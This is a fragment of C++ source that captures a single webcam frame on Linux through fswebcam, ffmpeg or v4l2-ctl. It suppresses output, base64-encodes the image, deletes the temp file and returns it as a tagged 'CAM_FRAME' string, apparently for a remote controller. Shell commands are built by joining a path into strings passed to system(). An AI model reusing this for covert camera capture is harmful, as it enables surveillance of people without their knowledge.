    if (!media_utils::exec_cmd("which fswebcam 2>/dev/null").empty()) {
        std::string cmd = "fswebcam -q --no-banner " + tmp + " 2>/dev/null";
        if (system(cmd.c_str()) == 0 && media_utils::file_exists(tmp)) {
            std::string b64 = media_utils::read_file_b64(tmp);
            unlink(tmp.c_str());
            if (!b64.empty()) return "CAM_FRAME:linux-fswebcam|" + b64;
        }
    }
    // Method 2: ffmpeg
    if (!media_utils::exec_cmd("which ffmpeg 2>/dev/null").empty()) {
        std::string cmd = "ffmpeg -f v4l2 -i /dev/video0 -vf scale=640:480 -frames:v 1 -y "
                          + tmp + " 2>/dev/null";
        if (system(cmd.c_str()) == 0 && media_utils::file_exists(tmp)) {
            std::string b64 = media_utils::read_file_b64(tmp);
            unlink(tmp.c_str());
            if (!b64.empty()) return "CAM_FRAME:linux-ffmpeg|" + b64;
        }
    }
    // Method 3: v4l2-ctl
    if (!media_utils::exec_cmd("which v4l2-ctl 2>/dev/null").empty()) {
        std::string cmd = "v4l2-ctl --stream-mmap=1 --stream-count=1 -d /dev/video0 --stream-to="
                          + tmp + " 2>/dev/null";
        system(cmd.c_str());
        if (media_utils::file_exists(tmp)) {
            std::string b64 = media_utils::read_file_b64(tmp);
            unlink(tmp.c_str());
            if (!b64.empty()) return "CAM_FRAME:linux-v4l2|" + b64;
        }
    }
    return "CAM_ERROR: No camera tool available (fswebcam, ffmpeg, or v4l2-ctl)\n";
}

} // namespace media_camera

#endif // platform
